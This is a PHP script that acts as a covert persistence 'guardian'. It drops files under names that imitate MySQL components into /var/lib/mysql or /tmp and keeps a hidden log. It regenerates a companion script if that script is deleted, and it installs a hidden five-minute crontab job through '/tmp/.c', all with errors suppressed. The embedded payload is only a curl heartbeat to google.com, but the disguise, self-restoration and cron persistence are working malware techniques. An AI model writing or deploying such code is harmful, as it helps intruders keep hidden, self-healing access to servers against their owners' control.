<?php
error_reporting(0);

$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$sysHash = substr(md5(gethostname()), 0, 4);
$name1 = "mysql_daemon_" . $sysHash . ".php";
$name2 = "mysql_lib_" . $sysHash . ".php";
$path1 = $targetDir . $name1;
$path2 = $targetDir . $name2;
$logFile = $targetDir . ".mysql_audit.log";

function writeLog($msg) {
    global $logFile;
    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [Guardian]: $msg\n", FILE_APPEND);
}

$file1_source = '<?php
$dir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$hash = substr(md5(gethostname()), 0, 4);
$n1 = "mysql_daemon_" . $hash . ".php";
$log = $dir . ".mysql_audit.log";
$ch = curl_init("https://google.com");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_exec($ch);
file_put_contents($log, "[" . date("Y-m-d H:i:s") . "] [Main]: Restored version heartbeat.\n", FILE_APPEND);
?>';

if (!file_exists($path1)) {
    writeLog("CRITICAL: File1 missing! Emergency offline recovery...");
    file_put_contents($path1, $file1_source);
    chmod($path1, 0755);
}

$cron = shell_exec("crontab -l 2>/dev/null");
if (strpos($cron, $name2) === false) {
    $job = "*/5 * * * * php $path2 > /dev/null 2>&1\n";
    file_put_contents("/tmp/.c", $cron . $job);
    shell_exec("crontab /tmp/.c");
    writeLog("Guardian cron restored.");
}
writeLog("Health check OK.");
?>
